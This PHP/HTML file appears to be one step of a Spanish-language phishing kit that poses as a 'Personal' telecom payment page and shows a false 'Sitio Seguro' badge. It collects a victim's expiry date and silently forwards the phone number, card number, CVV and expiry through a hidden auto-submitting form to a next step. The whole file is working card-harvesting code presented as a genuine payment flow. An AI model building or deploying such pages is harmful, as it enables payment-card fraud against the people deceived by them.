<?php
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
$card = isset($_POST['card']) ? trim($_POST['card']) : '';
$cv = isset($_POST['cv']) ? trim($_POST['cv']) : '';

if(isset($_POST['venc'])) {
    ?>
    <form id="autoForm" method="POST" action="step6.php">
        <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
        <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
        <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
        <input type="hidden" name="cv" value="<?php echo htmlspecialchars($cv); ?>">
        <input type="hidden" name="venc" value="<?php echo htmlspecialchars($_POST['venc']); ?>">
    </form>
    <script>document.getElementById('autoForm').submit();</script>
    <?php
    exit;
}

// Detectar tipo de tarjeta
$tipo_tarjeta = 'visa';
if (preg_match('/^5[1-5]/', $card) || preg_match('/^2[2-7]/', $card)) {
    $tipo_tarjeta = 'mastercard';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fecha de vencimiento | Personal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #2a2a2a;
            color: #fff;
        }
        
        .header {
            background: #2a2a2a;
            border-bottom: 1px solid #3a3a3a;
            color: #fff;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo { font-size: 18px; font-weight: 500; }
        .sitio-seguro { font-size: 12px; }
        
        .container {
            max-width: 600px;
            margin: 60px auto;
            padding: 0 20px;
        }
        
        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 50px;
        }
        
        /* TARJETA */
        .tarjeta {
            width: 100%;
            max-width: 400px;
            height: 240px;
            margin: 0 auto 50px;
            border-radius: 16px;
            padding: 25px 30px;
            position: relative;
            background: <?php echo $tipo_tarjeta === 'mastercard' ? 'linear-gradient(135deg, #eb001b 0%, #f79e1b 100%)' : '#1e3a8a'; ?>;
            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
        }
        
        .tarjeta-chip {
            width: 50px;
            height: 40px;
            background: linear-gradient(135deg, #ffd700 0%, #daa520 100%);
            border-radius: 8px;
            margin-bottom: 40px;
        }
        
        .tarjeta-numero {
            font-size: 26px;
            letter-spacing: 4px;
            font-family: 'Courier New', Courier, monospace;
            margin-bottom: 30px;
            font-weight: 400;
        }
        
        .tarjeta-bottom {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
        }
        
        .tarjeta-venc {
            font-size: 16px;
            font-family: 'Courier New', Courier, monospace;
            border: 2px solid rgba(255,255,255,0.3);
            padding: 8px 15px;
            border-radius: 6px;
            background: rgba(255,255,255,0.1);
        }
        
        .tarjeta-logo {
            position: absolute;
            top: 20px;
            right: 25px;
            font-size: 18px;
            font-weight: bold;
        }
        
        /* FORMULARIO */
        .form-group {
            margin-bottom: 30px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #fff;
        }
        
        input {
            width: 100%;
            padding: 14px 16px;
            background: #1a1a1a;
            border: 1px solid #444;
            border-radius: 6px;
            color: #fff;
            font-size: 16px;
        }
        
        input:focus {
            outline: none;
            border-color: #5d8bf4;
        }
        
        .help-text {
            font-size: 13px;
            color: #999;
            margin-top: 6px;
        }
        
        .botones {
            display: flex;
            gap: 12px;
            margin-top: 40px;
        }
        
        button {
            flex: 1;
            padding: 14px;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn-volver {
            background: transparent;
            border: 1px solid #5d8bf4;
            color: #5d8bf4;
        }
        
        .btn-volver:hover { background: rgba(93, 139, 244, 0.1); }
        
        .btn-siguiente {
            background: #5d8bf4;
            color: #fff;
        }
        
        .btn-siguiente:hover { background: #4a7de8; }
        .btn-siguiente:disabled {
            background: #444;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">personal flow</div>
        <div class="sitio-seguro">🔒 Sitio Seguro</div>
    </div>

    <div class="container">
        <h1>Fecha de vencimiento</h1>

        <div class="tarjeta">
            <div class="tarjeta-chip"></div>
            <div class="tarjeta-numero"><?php echo htmlspecialchars($card); ?></div>
            <div class="tarjeta-bottom">
                <div class="tarjeta-venc" id="displayVenc">MM/AA</div>
            </div>
            <div class="tarjeta-logo"><?php echo $tipo_tarjeta === 'mastercard' ? 'Mastercard' : 'VISA'; ?></div>
        </div>

        <form method="POST" action="step5.php">
            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
            <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
            <input type="hidden" name="cv" value="<?php echo htmlspecialchars($cv); ?>">
            
            <div class="form-group">
                <label>Vencimiento (MM/AA)</label>
                <input type="text" name="venc" id="venc" placeholder="12/26" maxlength="5" required autocomplete="off">
                <div class="help-text">Mes y año de vencimiento</div>
            </div>

            <div class="botones">
                <button type="button" class="btn-volver" onclick="window.history.back()">Volver</button>
                <button type="submit" class="btn-siguiente" id="btnContinuar" disabled>Continuar</button>
            </div>
        </form>
    </div>

    <script src="javascript/query.min.js"></script>
    <script src="javascript/jquery.mask.js"></script>
    <script>
        $(document).ready(function(){
            // Aplicar máscara
            if (typeof $.fn.mask !== 'undefined') {
                $('#venc').mask('00/00');
            }
            
            $('#venc').on('input', function(){
                var valor = $(this).val();
                
                // Mostrar en tarjeta
                $('#displayVenc').text(valor || 'MM/AA');
                
                // Validar formato y valores
                if (valor.length === 5) {
                    var partes = valor.split('/');
                    var mes = parseInt(partes[0]);
                    var anio = parseInt(partes[1]);
                    
                    if (mes >= 1 && mes <= 12 && anio >= 25) {
                        $('#btnContinuar').prop('disabled', false);
                    } else {
                        $('#btnContinuar').prop('disabled', true);
                    }
                } else {
                    $('#btnContinuar').prop('disabled', true);
                }
            });
        });
    </script>
</body>
</html>